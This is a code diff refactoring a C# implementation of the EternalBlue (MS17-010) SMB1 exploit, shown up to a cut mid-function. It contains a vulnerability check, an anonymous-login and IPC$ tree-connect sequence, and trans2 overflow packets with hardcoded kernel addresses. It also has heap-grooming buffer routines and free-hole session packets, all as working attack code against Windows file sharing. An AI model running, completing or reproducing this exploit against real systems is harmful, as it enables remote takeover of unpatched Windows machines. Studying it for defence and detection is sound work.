@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Eternalblue
@@ -9,163 +11,210 @@ namespace Eternalblue
     class Program
     {
 
-        public struct SMBHeader
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+        public struct NETBIOS_HEADER
         {
-            public byte[] server_component;
-            public byte smb_command;
-            public byte error_class;
-            public byte reserved1;
-            public byte[] error_code;
+            public uint MessageTypeAndSize;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+        public struct SMB_HEADER
+        {
+            public uint protocol;
+            public byte command;
+            public byte errorClass;
+            public byte _reserved;
+            public ushort errorCode;
             public byte flags;
-            public byte[] flags2;
-            public byte[] process_id_high;
-            public byte[] signature;
-            public byte[] reserved2;
-            public byte[] tree_id;
-            public byte[] process_id;
-            public byte[] user_id;
-            public byte[] multiplex_id;
+            public ushort flags2;
+            public ushort PIDHigh;
+            public ulong SecurityFeatures;
+            public ushort reserved;
+            public ushort TID;
+            public ushort PIDLow;
+            public ushort UID;
+            public ushort MID;
         }
 
-        public static SMBHeader Parsed_SMBHeader(byte[] unparsed)
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 1)]
+        public struct SMB_COM_SESSION_SETUP_ANDX_RESPONSE
         {
-            SMBHeader header = new SMBHeader();
-            header.server_component = unparsed.Take(4).ToArray();
-            header.smb_command = unparsed[4];
-            header.error_class = unparsed[5];
-            header.reserved1 = unparsed[6];
-            header.error_code = new byte[] { unparsed[6], unparsed[7] };
-            header.flags = unparsed[9];
-            header.flags2 = new byte[] { unparsed[10], unparsed[11] };
-            header.process_id_high = new byte[] { unparsed[12], unparsed[13] };
-            header.signature = new byte[] { unparsed[13], unparsed[14], unparsed[15], unparsed[16], unparsed[17], unparsed[18], unparsed[19], unparsed[20], unparsed[21] };
-            header.reserved2 = new byte[] { unparsed[22], unparsed[23] };
-            header.tree_id = new byte[] { unparsed[24], unparsed[25] };
-            header.process_id = new byte[] { unparsed[26], unparsed[27] };
-            header.user_id = new byte[] { unparsed[28], unparsed[29] };
-            header.multiplex_id = new byte[] { unparsed[30], unparsed[31] };
-
-            return header;
+            public byte WordCount;
+            public byte AndxCommand;
+            public byte reserved;
+            public ushort AndxOffset;
+            public ushort action;
+            public ushort ByteCount;
         }
 
-
-        static public byte[] SMB1_Get_Response(Socket sock)
+        static public byte[] SetNetBiosHeader(byte[] pkt)
         {
-            byte[] tcp_response = new byte[1024];
+            uint size = (uint)pkt.Length;
+            byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
+            NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
+            netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
+            byte[] netbios_header_packet = GetBytes(netbios_header);
+            byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
+            return fullMessage;
+        }
+
+        static public void SendSMBMessage(Socket sock, byte[] pkt, bool SetHeader)
+        {
+            //Calculate and set Message Length for NetBios Header
+            if (SetHeader) { 
+                pkt = SetNetBiosHeader(pkt);
+            }
             try
             {
-                sock.Receive(tcp_response);
-            } catch (Exception e)
+                sock.Send(pkt);
+            }
+            catch (Exception e)
             {
-                Console.WriteLine("Socket Error, exploit may fail: " + e);
-            }       
-            return tcp_response.Skip(4).ToArray(); 
+                Console.WriteLine("Socket Error, during sending: " + e.Message);
+            }
         }
 
-        static public void Detect_Version(byte[] res)
+        static public byte[] ReceiveSMBMessage(Socket sock)
         {
-            string hexValues = BitConverter.ToString(res).Replace("-", " ");
-            string[] hexValuesSplit = hexValues.Split(' ');
-            StringBuilder stringbuilder = new StringBuilder();
-            foreach (string hex in hexValuesSplit)
+            byte[] response = new byte[1024];
+            try
             {
-                int value = Convert.ToInt32(hex, 16);
-                string stringValue = Char.ConvertFromUtf32(value);
-                char charValue = (char)value;
-                if (Char.IsLetterOrDigit(charValue))
-                {
-                    stringbuilder.Append(charValue);
-                }
+                sock.Receive(response);
             }
-            string s = "";
-            char prev = 'W';
-            foreach (char c in stringbuilder.ToString().Substring(stringbuilder.ToString().IndexOf("Windows")))
+            catch (Exception e)
             {
-                if (Char.IsDigit(c))
-                {
-                    if (Char.IsDigit(prev))
-                    {
-                        s += c;
-                    }
-                    else
-                    {
-                        s += " " + c;
-                    }
-                }
-                else if (Char.IsLetter(c))
-                {
-                    if (Char.IsDigit(prev))
-                    {
-                        s += " " + c;
-                    }
-                    else
-                    {
-                        s += c;
-                    }
-                }
-                prev = c;
+                Console.WriteLine("Socket Error, during receive: " + e.Message);
             }
-            Console.WriteLine("Windows Version Detected: " + s);
+            return response.Skip(4).ToArray();
         }
 
-        static public bool Check_Vulnerability(Socket sock)
+        static public byte[] GetBytes(object str)
+        {
+            int size = Marshal.SizeOf(str);
+            byte[] arr = new byte[size];
+            IntPtr ptr = Marshal.AllocHGlobal(size);
+            Marshal.StructureToPtr(str, ptr, true);
+            Marshal.Copy(ptr, arr, 0, size);
+            Marshal.FreeHGlobal(ptr);
+            return arr;
+        }
+
+        static public SMB_COM_SESSION_SETUP_ANDX_RESPONSE SMB_AndxResponseFromBytes(byte[] arr)
+        {
+            SMB_COM_SESSION_SETUP_ANDX_RESPONSE str = new SMB_COM_SESSION_SETUP_ANDX_RESPONSE();
+            int size = Marshal.SizeOf(str);
+            IntPtr ptr = Marshal.AllocHGlobal(size);
+            Marshal.Copy(arr, 0, ptr, size);
+            str = (SMB_COM_SESSION_SETUP_ANDX_RESPONSE)Marshal.PtrToStructure(ptr, str.GetType());
+            Marshal.FreeHGlobal(ptr);
+            return str;
+        }
+
+        static public SMB_HEADER SMB_HeaderFromBytes(byte[] arr)
+        {
+            SMB_HEADER str = new SMB_HEADER();
+            int size = Marshal.SizeOf(str);
+            IntPtr ptr = Marshal.AllocHGlobal(size);
+            Marshal.Copy(arr, 0, ptr, size);
+            str = (SMB_HEADER)Marshal.PtrToStructure(ptr, str.GetType());
+            Marshal.FreeHGlobal(ptr);
+            return str;
+        }
+
+        static public bool IsValidSMB1Header(SMB_HEADER header)
+        {
+            if (header.protocol == 0x424d53ff)
+            {
+                return true;
+            }
+            return false;
+        }
+
+        static public void DetectVersionOfWindows(byte[] res)
+        {
+            SMB_HEADER header = SMB_HeaderFromBytes(res);
+            if (!IsValidSMB1Header(header))
+            {
+                Console.WriteLine("Did not receive proper response when determining version... Are you sure this server is running SMB?");
+                return;
+            }
+            int sizeOfHeader = Marshal.SizeOf(header);
+            SMB_COM_SESSION_SETUP_ANDX_RESPONSE andxr = SMB_AndxResponseFromBytes(res.Skip(sizeOfHeader).ToArray());
+            int byteCount = andxr.ByteCount;
+            int sizeOfAndxr = Marshal.SizeOf(andxr);
+            byte[] data = res.Skip(sizeOfHeader + sizeOfAndxr + 1).ToArray().Take(byteCount).ToArray(); //The 1 is for Padding- This could become a problem 
+            string hexString = BitConverter.ToString(data).Replace("-00-00-00-", "&"); //The SMB data is split using 3 0x00 bytes, these are changed to an '&' for easier split
+            string[] hexStringSplit = hexString.Split('&');
+
+            for (int i=0; i<3; i++)
+            {
+                StringBuilder strbuilder = new StringBuilder();
+                string[] charArray = hexStringSplit[i].Split('-');
+                foreach (string chars in charArray)
+                {
+                    int value = Convert.ToInt32(chars, 16);
+                    char charValue = (char)value;
+                    if (charValue != 0)
+                    {
+                        strbuilder.Append(charValue);
+                    }
+                }
+                if (i == 0)
+                {
+                    Console.WriteLine("Native OS: " + strbuilder.ToString());
+                }
+                else if (i == 1)
+                {
+                    Console.WriteLine("Native LAN Manager: " + strbuilder.ToString());
+                }
+                else if (i == 2)
+                {
+                    Console.WriteLine("Domain: " + strbuilder.ToString());
+                }
+            }
+        }
+
+        static public bool CheckVulnerability(Socket sock)
         {
             bool vulnerable = false;
-            byte[] pkt = { 0x00, 0x00, 0x00, 0x00, 0xff, 0x53, 0x4d, 0x42, 0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0, 0x08, 0x04, 0x56, 0x00, 0x08, 0x24, 0x86, 0x10, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x02, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45, 0x5c, 0x00 };
-            int len = pkt.Length - 4;
-            byte[] hexlen = BitConverter.GetBytes(len);
-            pkt[1] = hexlen[2];
-            pkt[2] = hexlen[1];
-            pkt[3] = hexlen[0];
-            sock.Send(pkt);
+            byte[] pkt = { 0xff, 0x53, 0x4d, 0x42, 0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0, 0x08, 0x04, 0x56, 0x00, 0x08, 0x24, 0x86, 0x10, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x02, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45, 0x5c, 0x00 };
+            SendSMBMessage(sock, pkt, true);
+            SMB_HEADER header = SMB_HeaderFromBytes(ReceiveSMBMessage(sock));
 
-            byte[] response = SMB1_Get_Response(sock);
-            byte[] pattern = { 0x05, 0x02, 0x00, 0xc0 };
-            string haystack = BitConverter.ToString(response);
-            string needle = BitConverter.ToString(pattern);
-
-            if (haystack.Contains(needle))
+            if (header.errorClass == 0x05 && header._reserved == 0x02 && header.errorCode == 0xc000) //This equals STATUS_INSUFF_SERVER_RESOURCES
             {
-                vulnerable = true;
+                return true;
             }
-
             return vulnerable;
         }
 
-        static public byte[] Client_Negotiate(Socket sock)
+        static public byte[] ClientNegotiate(Socket sock)
         {
-            byte[] pkt = new byte[] { 0x00, 0x00, 0x00, 0x54, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B, 0x00, 0x00, 0xC5, 0x5E, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00 };
-            sock.Send(pkt);
-            return SMB1_Get_Response(sock);
+            byte[] pkt = new byte[] { 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B, 0x00, 0x00, 0xC5, 0x5E, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00 };
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
         }
 
-        static public byte[] smb1_anonymous_login(Socket sock)
+        static public byte[] SMB1AnonymousLogin(Socket sock)
         {
-            byte[] pkt = make_smb1_anonymous_login_packet();
-            sock.Send(pkt);
-            return SMB1_Get_Response(sock);
-        }
-
-        static public byte[] make_smb1_anonymous_login_packet()
-        {
-            byte[] pkt = { 0x00, 0x00, 0x00, 0x88, 0xff, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0d, 0xff, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00 };
-            return pkt;
+            byte[] pkt = { 0xff, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0d, 0xff, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00 };
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
         }
 
 
-        static public byte[] tree_connect_andx(string ip, Socket sock, byte[] user_id)
+        static public byte[] TreeConnectAndX(string ip, Socket sock, ushort UID)
         {
-            byte[] pkt = tree_connect_andx_request(ip, user_id);
-            sock.Send(pkt);
-
-            return SMB1_Get_Response(sock);
+            byte[] pkt = TreeConnectAndXRequest(ip, UID);
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
         }
 
-        static public byte[] tree_connect_andx_request(string ip, byte[] user_id)
+        static public byte[] TreeConnectAndXRequest(string ip, ushort UID)
         {
             string ipc = @"\\" + ip + @"\IPC$";
-
-            byte[] pkt = new byte[] { 0x00, 0x00, 0x00, 0x47, 0xff, 0x53, 0x4d, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x4b, user_id[0], user_id[1], 0xc5, 0x5e, 0x04, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x1a, 0x00, 0x00 };
+            byte[] user_id = BitConverter.GetBytes(UID);
+            byte[] pkt = new byte[] { 0xff, 0x53, 0x4d, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x4b, user_id[0], user_id[1], 0xc5, 0x5e, 0x04, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x1a, 0x00, 0x00 };
             byte[] ipc_byte = Encoding.ASCII.GetBytes(ipc);
             byte[] rest = new byte[] { 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 };
 
@@ -173,17 +222,13 @@ namespace Eternalblue
             pkt = pkt.Concat(ipc_byte).ToArray();
             pkt = pkt.Concat(rest).ToArray();
 
-            int len = pkt.Length - 4;
-            byte[] hexlen = BitConverter.GetBytes(len);
-            pkt[1] = hexlen[2];
-            pkt[2] = hexlen[1];
-            pkt[3] = hexlen[0];
-
             return pkt;
         }
 
-        static public byte[] make_smb1_nt_trans_packet(byte[] tree_id, byte[] user_id)
+        static public byte[] MakeSMB1NTTransPacket(ushort TID, ushort UID)
         {
+            byte[] user_id = BitConverter.GetBytes(UID);
+            byte[] tree_id = BitConverter.GetBytes(TID);
             byte[] pkt = { 0x00, 0x00, 0x04, 0x38, 0xff, 0x53, 0x4D, 0x42,0xa0, 0x00, 0x00, 0x00, 0x00 ,0x18, 0x07, 0xc0 , 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 ,0x00,0x00, tree_id[0], tree_id[1], 0xff,0xfe,user_id[0],user_id[1], 0x40, 0x00, 0x14,0x01,0x00,0x00, 0x1e, 0x00, 0x00, 0x00 , 0xd0, 0x03, 0x01, 0x00 , 0x1e, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x1e, 0x00, 0x00, 0x00 , 0x4b, 0x00, 0x00, 0x00 , 0xd0, 0x03, 0x00, 0x00 , 0x68, 0x00, 0x00, 0x00 , 0x01 , 0x00, 0x00 , 0x00, 0x00 , 0xec, 0x03};
             byte[] NT_Parameters = Enumerable.Repeat((byte)0x00, 31).ToArray();
             byte[] single = { 0x01 };
@@ -195,7 +240,7 @@ namespace Eternalblue
             return pkt;
         }
 
-        static public List<byte> helper(List<byte> arr, byte b, int times)
+        static public List<byte> Helper(List<byte> arr, byte b, int times)
         {
             for (int i = 0; i < times; i++)
             {
@@ -204,70 +249,72 @@ namespace Eternalblue
             return arr;
         }
 
-        static public byte[] make_smb1_trans2_exploit_packet(byte[] tree_id, byte[] user_id, string type, int time)
+        static public byte[] MakeSMB1Trans2ExploitPacket(ushort TID, ushort UID, string type, int time)
         {
+            byte[] user_id = BitConverter.GetBytes(UID);
+            byte[] tree_id = BitConverter.GetBytes(TID);
             int timeout = (time * 16) + 3;
             byte[] pkt = { 0x00, 0x00, 0x10, 0x35, 0xff, 0x53, 0x4D, 0x42, 0x33, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, tree_id[0], tree_id[1], 0xff, 0xfe, user_id[0], user_id[1], 0x40, 0x00, 0x09, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x35, 0x00, 0xd0, BitConverter.GetBytes(timeout)[0], 0x00, 0x00, 0x00, 0x10 };
             if (type.Equals("eb_trans2_exploit"))
             {
                 List<byte> nt_trans_ex = new List<byte>();
                 
-                nt_trans_ex = helper(nt_trans_ex, 0x41, 2957); //Overflow
+                nt_trans_ex = Helper(nt_trans_ex, 0x41, 2957); //Overflow
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x80,0x00,0xa8,0x00
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 16); //0x10
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 16); //0x10
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0xff,0xff
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 6); //0x6
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 6); //0x6
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0xff,0xff
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 22); //0x16
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 22); //0x16
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x00,0xf1,0xdf,0xff // x86 addresses
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 8); //0x8
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 8); //0x8
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff,0x60,0x00,0x04,0x10
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 4); //4
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 4); //4
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x80,0xef,0xdf,0xff
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 4); //4
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 4); //4
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 16); //0x10
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 16); //0x10
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x60,0x00,0x04,0x10
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 12); //0xc
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 12); //0xc
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 8); //0x8
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 8); //0x8
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x80,0x10
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 14); //0xe
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 14); //0xe
                 nt_trans_ex.AddRange(new List<byte>()
                 {
                      0x39,0xbb
                 });
-                nt_trans_ex = helper(nt_trans_ex, 0x41, 965); //Overflow continues
+                nt_trans_ex = Helper(nt_trans_ex, 0x41, 965); //Overflow continues
                 pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
                 return pkt;
             }
@@ -275,104 +322,102 @@ namespace Eternalblue
             if (type.Equals("eb_trans2_zero"))
             {
                 List<byte> nt_trans_ex = new List<byte>();
-                nt_trans_ex = helper(nt_trans_ex, 0x00, 2055);
+                nt_trans_ex = Helper(nt_trans_ex, 0x00, 2055);
                 nt_trans_ex.Add(0x83);
                 nt_trans_ex.Add(0xf3);
-                nt_trans_ex = helper(nt_trans_ex, 0x41, 2039);
+                nt_trans_ex = Helper(nt_trans_ex, 0x41, 2039);
                 pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
                 return pkt;
             } else
             {
                 List<byte> nt_trans_ex = new List<byte>();
-                nt_trans_ex = helper(nt_trans_ex, 0x41, 4096);
+                nt_trans_ex = Helper(nt_trans_ex, 0x41, 4096);
                 pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
             }
 
             return pkt;
         }
 
-        static public byte[] make_smb1_echo_packet(byte[] tree_id, byte[] user_id)
+        static public byte[] MakeSMB1EchoPacket(ushort TID, ushort UID)
         {
+            byte[] user_id = BitConverter.GetBytes(UID);
+            byte[] tree_id = BitConverter.GetBytes(TID);
             byte[] pkt = { 0x00, 0x00, 0x00, 0x31, 0xff, 0x53, 0x4D, 0x42, 0x2b, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, tree_id[0], tree_id[1], 0xff, 0xfe, user_id[0], user_id[1], 0x40, 0x00, 0x01, 0x01, 0x00, 0x0c, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00 };
             
             return pkt;
         }
 
-        static public byte[] smb1_large_buffer(SMBHeader header, Socket sock)
+        static public byte[] SMB1LargeBuffer(SMB_HEADER header, Socket sock)
         {
-            //Send NT Trans
-            byte[] nt_trans_pkt = make_smb1_nt_trans_packet(header.tree_id, header.user_id);
-            
-            sock.Send(nt_trans_pkt);
-            //Parse result
-            byte[] response = SMB1_Get_Response(sock);
-            SMBHeader nt_trans_response = Parsed_SMBHeader(response);
+            //Send and Recveive NT Trans packet 
+            byte[] nt_trans_pkt = MakeSMB1NTTransPacket(header.TID, header.UID);
+            SendSMBMessage(sock, nt_trans_pkt, false);
+            ReceiveSMBMessage(sock);
 
             //initial trans2 request
-            byte[] trans_pkt_nulled = make_smb1_trans2_exploit_packet(header.tree_id, header.user_id, "eb_trans2_zero", 0);
+            byte[] trans_pkt_nulled = MakeSMB1Trans2ExploitPacket(header.TID, header.UID, "eb_trans2_zero", 0);
 
             //Send all but the last packet
             for (int i=1; i <= 14; i++)
             {
-                byte[] temp = make_smb1_trans2_exploit_packet(header.tree_id, header.user_id, "eb_trans2_buffer", i);
+                byte[] temp = MakeSMB1Trans2ExploitPacket(header.TID, header.UID, "eb_trans2_buffer", i);
                 trans_pkt_nulled = trans_pkt_nulled.Concat(temp).ToArray();
             }
-            byte[] echo = make_smb1_echo_packet(header.tree_id, header.user_id);
-            
+            //Create SMB1 Echo packet
+            byte[] echo = MakeSMB1EchoPacket(header.TID, header.UID);
             trans_pkt_nulled = trans_pkt_nulled.Concat(echo).ToArray();
-            sock.Send(trans_pkt_nulled);
-            return SMB1_Get_Response(sock);
+            SendSMBMessage(sock, trans_pkt_nulled, false);
+
+            return ReceiveSMBMessage(sock);
         }
 
-        static public byte[] make_smb1_free_hole_session_packet(byte[] flags2, byte[] vcnum, byte[] native_os)
+        static public byte[] MakeSMB1FreeHoleSessionPacket(byte[] flags2, byte[] vcnum, byte[] native_os)
         {
-            byte[] pkt = { 0x00, 0x00, 0x00, 0x51, 0xff, 0x53, 0x4D, 0x42,0x73, 0x00, 0x00, 0x00, 0x00 , 0x18, flags2[0],flags2[1], 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00 , 0xff, 0xfe , 0x00, 0x00 , 0x40, 0x00 , 0x0c , 0xff , 0x00, 0x00, 0x00, 0x04, 0x11, 0x0a, 0x00, vcnum[0],vcnum[1], 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x80 ,0x16,0x00,native_os[0],native_os[1],native_os[2],native_os[3],native_os[4]};
+            byte[] pkt = { 0xff, 0x53, 0x4D, 0x42,0x73, 0x00, 0x00, 0x00, 0x00 , 0x18, flags2[0],flags2[1], 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00 , 0xff, 0xfe , 0x00, 0x00 , 0x40, 0x00 , 0x0c , 0xff , 0x00, 0x00, 0x00, 0x04, 0x11, 0x0a, 0x00, vcnum[0],vcnum[1], 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x80 ,0x16,0x00,native_os[0],native_os[1],native_os[2],native_os[3],native_os[4]};
             byte[] rest = Enumerable.Repeat((byte)0x00, 17).ToArray();
             pkt = pkt.Concat(rest).ToArray();
             return pkt;
         }
 
-        static public Socket smb1_free_hole(string ip, int port, bool start)
+        static public Socket SMB1FreeHole(string ip, int port, bool start)
         {
             TcpClient client = new TcpClient(ip, port);
             Socket sock = client.Client;
-            Client_Negotiate(sock);
+            ClientNegotiate(sock);
             byte[] pkt;
             if (start)
             {
                 byte[] flags2 = {0x07,0xc0} ;
                 byte[] vcnum = { 0x2d, 0x01 };
                 byte[] native_os = { 0xf0, 0xff, 0x00, 0x00, 0x00 };
-                pkt = make_smb1_free_hole_session_packet(flags2, vcnum,native_os);
+                pkt = MakeSMB1FreeHoleSessionPacket(flags2, vcnum, native_os);
             } 
             else
             {
                 byte[] flags2 = { 0x07, 0x40 };
                 byte[] vcnum = { 0x2c, 0x01 };
                 byte[] native_os = { 0xf8, 0x87, 0x00, 0x00, 0x00 };
-                pkt = make_smb1_free_hole_session_packet(flags2, vcnum, native_os);
